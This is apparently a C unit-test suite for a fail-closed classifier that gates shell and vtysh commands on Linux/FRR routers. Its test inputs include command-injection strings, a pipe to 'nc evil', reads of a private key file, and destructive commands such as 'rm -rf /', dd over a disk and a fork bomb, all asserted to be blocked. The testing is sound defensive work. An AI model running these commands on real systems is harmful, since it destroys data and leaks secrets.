/*
 * Copyright (c) 2026 Third Level IT LLC. All rights reserved.
 * VIRP — Verified Infrastructure Response Protocol
 * Linux/FRR vtysh gate-classifier unit tests (linux_gate_classify).
 *
 * The linux driver executes raw shell over an SSH exec channel, so the
 * classifier is guard-first: separator policy and the anchored
 * `vtysh -c "<arg>"` form run before any table row, failure = RED.
 * FAIL-CLOSED: anything not explicitly GREEN/YELLOW is RED, and
 * abbreviations are never expanded ("sh ip os nei" must NOT classify).
 * The table never returns BLACK — every RED stays approvable.
 */

#include "virp.h"
#include "virp_driver.h"
#include <stdio.h>
#include <string.h>
#include <assert.h>

/* Under test — exported from driver_linux.c (forward-declared here the
 * way test_driver_cisco_gate.c declares cisco_gate_tier). */
virp_trust_tier_t linux_gate_classify(const char *command, const char **reason);
virp_trust_tier_t linux_gate_tier(const char *command);
const char *linux_gate_reason(const char *command);

static int tests_run = 0, tests_passed = 0;
#define TEST(name) do { tests_run++; printf("  [%d] %s ... ", tests_run, name); } while(0)
#define PASS() do { tests_passed++; printf("PASS\n"); } while(0)

/*
 * Gate-level mirror of gate_tier_blocks() in virp_onode.c under the
 * deployed threshold (max tier YELLOW): UNCLASSIFIED and BLACK always
 * block, otherwise anything above YELLOW blocks. Every RED assertion
 * below also asserts the gate DECISION so a classifier regression that
 * returns a passing tier fails here, not on the wire.
 */
static int gate_blocks_at_yellow(virp_trust_tier_t t)
{
    if (t == VIRP_TIER_UNCLASSIFIED) return 1;
    if (t == VIRP_TIER_BLACK)        return 1;
    return t > VIRP_TIER_YELLOW;
}

static void assert_red_blocked(const char *cmd)
{
    virp_trust_tier_t t = linux_gate_tier(cmd);
    assert(t == VIRP_TIER_RED);
    assert(gate_blocks_at_yellow(t));
    assert(t != VIRP_TIER_BLACK);   /* RED stays approvable */
}

static void test_guard_separators(void)
{
    printf("\n=== Guards — separator policy (evaluated before any row) ===\n");

    TEST("semicolon chain bypass -> RED at guard");
    assert_red_blocked("vtysh -c \"show ip ospf neighbor\"; rm -rf /etc/frr");
    {
        const char *why = linux_gate_reason(
            "vtysh -c \"show ip ospf neighbor\"; rm -rf /etc/frr");
        assert(why != NULL && strstr(why, "metacharacter") != NULL);
    }
    PASS();

    TEST("pipe inside quoted arg -> RED");
    assert_red_blocked("vtysh -c \"show running-config | include password\"");
    PASS();

    TEST("backtick inside quoted arg -> RED");
    assert_red_blocked("vtysh -c \"show `id` neighbor\"");
    PASS();

    TEST("$( inside quoted arg -> RED");
    assert_red_blocked("vtysh -c \"show $(id) neighbor\"");
    PASS();

    TEST("ampersand -> RED");
    assert_red_blocked("vtysh -c \"show ip route\" & wget evil");
    PASS();

    TEST("newline -> RED");
    assert_red_blocked("vtysh -c \"show ip route\"\nrm -rf /");
    PASS();

    TEST("redirection outside arg -> RED");
    assert_red_blocked("vtysh -c \"show running-config\" > /etc/frr/frr.conf");
    PASS();

    TEST("backslash outside arg -> RED");
    assert_red_blocked("vtysh \\-c \"show ip route\"");
    PASS();
}

static void test_guard_vtysh_form(void)
{
    printf("\n=== Guards — anchored vtysh form ===\n");

    TEST("double -c -> RED always");
    assert_red_blocked("vtysh -c \"show ip ospf neighbor\" -c \"configure terminal\"");
    {
        const char *why = linux_gate_reason(
            "vtysh -c \"show ip ospf neighbor\" -c \"configure terminal\"");
        assert(why != NULL && strstr(why, "-c") != NULL);
    }
    PASS();

    TEST("env-var prefix -> RED");
    assert_red_blocked("FRR_PAGER=cat vtysh -c \"show running-config\"");
    PASS();

    TEST("command prefix -> RED");
    assert_red_blocked("nice vtysh -c \"show ip route\"");
    PASS();

    TEST("missing quotes -> RED");
    assert_red_blocked("vtysh -c show ip ospf neighbor");
    PASS();

    TEST("trailing bytes after closing quote -> RED");
    assert_red_blocked("vtysh -c \"show ip route\" extra");
    PASS();

    TEST("empty quoted arg -> RED");
    assert_red_blocked("vtysh -c \"\"");
    PASS();

    TEST("bare vtysh (interactive shell) -> RED");
    assert_red_blocked("vtysh");
    PASS();
}

static void test_no_abbreviation_expansion(void)
{
    printf("\n=== No abbreviation expansion ===\n");

    TEST("sh ip os nei -> RED (falls through, not expanded)");
    assert_red_blocked("vtysh -c \"sh ip os nei\"");
    assert(linux_gate_reason("vtysh -c \"sh ip os nei\"") == NULL);
    PASS();

    TEST("sho running-config -> RED");
    assert_red_blocked("vtysh -c \"sho running-config\"");
    PASS();

    TEST("conf t -> RED (generic — not the configure row)");
    assert_red_blocked("vtysh -c \"conf t\"");
    PASS();
}

static void test_green(void)
{
    printf("\n=== GREEN — vtysh show reads ===\n");

    TEST("show ip ospf neighbor -> GREEN");
    assert(linux_gate_tier("vtysh -c \"show ip ospf neighbor\"") == VIRP_TIER_GREEN);
    PASS();

    TEST("show running-config -> GREEN (explicit row)");
    assert(linux_gate_tier("vtysh -c \"show running-config\"") == VIRP_TIER_GREEN);
    PASS();

    TEST("show ip route 10.0.0.0/8 -> GREEN (charset covers ./-)");
    assert(linux_gate_tier("vtysh -c \"show ip route 10.0.0.0/8\"") == VIRP_TIER_GREEN);
    PASS();

    TEST("whitespace runs + keyword case canonicalized -> GREEN");
    assert(linux_gate_tier("  VTYSH   -c   \"SHOW  IP  OSPF  NEIGHBOR\"  ") == VIRP_TIER_GREEN);
    PASS();

    TEST("show with out-of-charset rest -> RED");
    assert_red_blocked("vtysh -c \"show ip_route\"");
    PASS();

    TEST("shower -> RED (token boundary)");
    assert_red_blocked("vtysh -c \"shower\"");
    PASS();
}

static void test_yellow(void)
{
    printf("\n=== YELLOW — bounded operational actions ===\n");

    TEST("clear ip ospf neighbor -> YELLOW");
    assert(linux_gate_tier("vtysh -c \"clear ip ospf neighbor\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("clear ip ospf neighbor 2.2.2.2 -> YELLOW");
    assert(linux_gate_tier("vtysh -c \"clear ip ospf neighbor 2.2.2.2\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("clear ip ospf interface eth1 -> YELLOW");
    assert(linux_gate_tier("vtysh -c \"clear ip ospf interface eth1\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("ping -> YELLOW");
    assert(linux_gate_tier("vtysh -c \"ping 10.10.12.2\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("traceroute -> YELLOW");
    assert(linux_gate_tier("vtysh -c \"traceroute 4.4.4.4\"") == VIRP_TIER_YELLOW);
    PASS();
}

static void test_red_teaching_rows(void)
{
    printf("\n=== RED — explicit rows with instructive reasons ===\n");

    TEST("configure terminal -> RED + teaching reason");
    assert_red_blocked("vtysh -c \"configure terminal\"");
    {
        const char *why = linux_gate_reason("vtysh -c \"configure terminal\"");
        assert(why != NULL);
        assert(strstr(why, "configuration change") != NULL);
        assert(strstr(why, "propose/approve/apply") != NULL);
    }
    PASS();

    TEST("configure <anything> -> RED + teaching reason");
    assert_red_blocked("vtysh -c \"configure\"");
    assert(linux_gate_reason("vtysh -c \"configure\"") != NULL);
    PASS();

    TEST("clear ip ospf process -> RED + teaching reason");
    assert_red_blocked("vtysh -c \"clear ip ospf process\"");
    {
        const char *why = linux_gate_reason("vtysh -c \"clear ip ospf process\"");
        assert(why != NULL);
        assert(strstr(why, "propose/approve/apply") != NULL);
    }
    PASS();

    TEST("sed -i on /etc/frr/frr.conf -> RED + teaching reason");
    assert_red_blocked("sed -i s/1/2/ /etc/frr/frr.conf");
    {
        const char *why = linux_gate_reason("sed -i s/1/2/ /etc/frr/frr.conf");
        assert(why != NULL);
        assert(strstr(why, "propose/approve/apply") != NULL);
    }
    PASS();

    TEST("systemctl restart frr -> RED + teaching reason");
    assert_red_blocked("systemctl restart frr");
    assert(linux_gate_reason("systemctl restart frr") != NULL);
    PASS();

    TEST("systemctl stop frr.service -> RED + teaching reason");
    assert_red_blocked("systemctl stop frr.service");
    assert(linux_gate_reason("systemctl stop frr.service") != NULL);
    PASS();
}

static void test_red_by_absence(void)
{
    printf("\n=== RED — fail closed by absence (generic reason) ===\n");

    TEST("cat /etc/frr/frr.conf -> RED by absence (read, not the write row)");
    assert_red_blocked("cat /etc/frr/frr.conf");
    assert(linux_gate_reason("cat /etc/frr/frr.conf") == NULL);
    PASS();

    TEST("uptime -> RED by absence");
    assert_red_blocked("uptime");
    assert(linux_gate_reason("uptime") == NULL);
    PASS();

    TEST("write memory (vtysh, unlisted) -> RED by absence");
    assert_red_blocked("vtysh -c \"write memory\"");
    assert(linux_gate_reason("vtysh -c \"write memory\"") == NULL);
    PASS();

    TEST("copy running-config startup-config (unlisted) -> RED");
    assert_red_blocked("vtysh -c \"copy running-config startup-config\"");
    PASS();

    TEST("empty command -> RED");
    assert_red_blocked("");
    PASS();

    TEST("NULL command -> RED");
    assert(linux_gate_classify(NULL, NULL) == VIRP_TIER_RED);
    PASS();
}

static void test_peer_health_rows(void)
{
    printf("\n=== GREEN — peer-health rows (exact match only) ===\n");

    TEST("systemctl is-active virp-onode -> GREEN");
    assert(linux_gate_tier("systemctl is-active virp-onode") == VIRP_TIER_GREEN);
    PASS();

    TEST("chain tail -n 1 -> GREEN");
    assert(linux_gate_tier("/opt/virp/build/virp-tool chain tail -n 1 "
                           "--db /var/lib/virp/chain.db") == VIRP_TIER_GREEN);
    PASS();

    TEST("cat published.json -> GREEN");
    assert(linux_gate_tier("cat /var/lib/virp/autopilot/published.json")
           == VIRP_TIER_GREEN);
    PASS();

    TEST("whitespace/case canonicalization still matches -> GREEN");
    assert(linux_gate_tier("  SYSTEMCTL   IS-ACTIVE   virp-onode ")
           == VIRP_TIER_GREEN);
    PASS();

    printf("\n=== RED — adversarial neighbours of the peer rows ===\n");

    TEST("systemctl stop virp-onode -> RED (exact match blocks it)");
    assert_red_blocked("systemctl stop virp-onode"); PASS();

    TEST("systemctl restart virp-onode -> RED");
    assert_red_blocked("systemctl restart virp-onode"); PASS();

    TEST("systemctl is-active virp-onode + extra arg -> RED");
    assert_red_blocked("systemctl is-active virp-onode --quiet"); PASS();

    TEST("systemctl is-enabled virp-onode -> RED (unlisted verb)");
    assert_red_blocked("systemctl is-enabled virp-onode"); PASS();

    TEST("chain tail with a different -n -> RED");
    assert_red_blocked("/opt/virp/build/virp-tool chain tail -n 50 "
                       "--db /var/lib/virp/chain.db"); PASS();

    TEST("chain tail against a different db -> RED");
    assert_red_blocked("/opt/virp/build/virp-tool chain tail -n 1 "
                       "--db /tmp/evil.db"); PASS();

    TEST("virp-tool keygen via the peer path -> RED");
    assert_red_blocked("/opt/virp/build/virp-tool keygen okey /tmp/k"); PASS();

    TEST("cat of a different file -> RED (one fixed path only)");
    assert_red_blocked("cat /var/lib/virp/autopilot/alerts.jsonl");
    assert_red_blocked("cat /etc/virp/keys/onode.key");
    assert_red_blocked("cat /var/lib/virp/devices.json");
    PASS();

    TEST("cat published.json with a trailing pipe -> RED at the guard");
    assert_red_blocked("cat /var/lib/virp/autopilot/published.json | nc evil 1"); PASS();

    TEST("peer rows do not leak the FRR teaching reasons");
    assert(linux_gate_reason("systemctl is-active virp-onode") == NULL);
    assert(linux_gate_reason("cat /var/lib/virp/autopilot/published.json") == NULL);
    PASS();
}

/*
 * INVARIANT: this table never returns BLACK.
 *
 * The approved-apply path in virp_onode.c refuses BLACK outright
 * (aerr = VIRP_ERR_TIER_VIOLATION) before any approval is verified, so a
 * BLACK row here would make its commands permanently unapprovable — the
 * propose→approve→apply escalation this driver's teaching reasons point
 * operators at would dead-end for exactly the commands most likely to
 * need it. Every refusal must stay RED, which is blocked-but-approvable.
 *
 * Asserted over the whole corpus this suite exercises plus the BLACK-
 * bait commands most likely to tempt a future contributor into adding a
 * BLACK row.
 */
static void test_never_returns_black(void)
{
    printf("\n=== INVARIANT — the table never returns BLACK ===\n");

    static const char *const corpus[] = {
        /* GREEN + YELLOW rows */
        "vtysh -c \"show ip ospf neighbor\"",
        "vtysh -c \"show running-config\"",
        "vtysh -c \"clear ip ospf neighbor\"",
        "vtysh -c \"clear ip ospf interface eth1\"",
        "vtysh -c \"ping 10.10.12.2\"",
        "vtysh -c \"traceroute 4.4.4.4\"",
        /* teaching-RED rows */
        "vtysh -c \"configure terminal\"",
        "vtysh -c \"clear ip ospf process\"",
        "sed -i s/1/2/ /etc/frr/frr.conf",
        "systemctl restart frr",
        /* guards */
        "vtysh -c \"show ip ospf neighbor\"; rm -rf /etc/frr",
        "vtysh -c \"show x\" -c \"configure terminal\"",
        "FRR_PAGER=cat vtysh -c \"show running-config\"",
        /* peer rows + their neighbours */
        "systemctl is-active virp-onode",
        "systemctl stop virp-onode",
        "cat /var/lib/virp/autopilot/published.json",
        "cat /etc/virp/keys/onode.key",
        /* BLACK bait — destructive things a contributor might reach for */
        "rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda1",
        "shutdown -h now",
        "reboot",
        "systemctl stop frr",
        "vtysh -c \"write erase\"",
        "chmod -R 777 /etc",
        "userdel -r nhoward",
        ":(){ :|:& };:",
        "",
    };

    TEST("no command in the corpus classifies BLACK");
    for (size_t i = 0; i < sizeof(corpus) / sizeof(corpus[0]); i++) {
        virp_trust_tier_t t = linux_gate_tier(corpus[i]);
        assert(t != VIRP_TIER_BLACK);
        /* and the tier must be one the wire can carry */
        assert(t == VIRP_TIER_GREEN || t == VIRP_TIER_YELLOW ||
               t == VIRP_TIER_RED);
    }
    assert(linux_gate_tier(NULL) != VIRP_TIER_BLACK);
    PASS();

    TEST("every blocked command stays RED (approvable), never BLACK");
    for (size_t i = 0; i < sizeof(corpus) / sizeof(corpus[0]); i++) {
        virp_trust_tier_t t = linux_gate_tier(corpus[i]);
        if (gate_blocks_at_yellow(t))
            assert(t == VIRP_TIER_RED);
    }
    PASS();
}

static void test_gate_decisions(void)
{
    printf("\n=== Gate-level decisions at threshold YELLOW ===\n");

    TEST("GREEN read passes the gate");
    assert(!gate_blocks_at_yellow(linux_gate_tier("vtysh -c \"show ip ospf neighbor\"")));
    PASS();

    TEST("YELLOW action passes the gate");
    assert(!gate_blocks_at_yellow(linux_gate_tier("vtysh -c \"clear ip ospf neighbor\"")));
    PASS();

    TEST("RED config change blocks at the gate");
    assert(gate_blocks_at_yellow(linux_gate_tier("vtysh -c \"configure terminal\"")));
    PASS();

    TEST("guard rejection blocks at the gate");
    assert(gate_blocks_at_yellow(linux_gate_tier(
        "vtysh -c \"show ip ospf neighbor\"; rm -rf /etc/frr")));
    PASS();
}

int main(void)
{
    printf("=== Linux/FRR vtysh Gate Classifier Tests ===\n");

    test_guard_separators();
    test_guard_vtysh_form();
    test_no_abbreviation_expansion();
    test_green();
    test_yellow();
    test_red_teaching_rows();
    test_red_by_absence();
    test_peer_health_rows();
    test_never_returns_black();
    test_gate_decisions();

    printf("\n=== Results: %d/%d passed ===\n", tests_passed, tests_run);
    return tests_passed == tests_run ? 0 : 1;
}
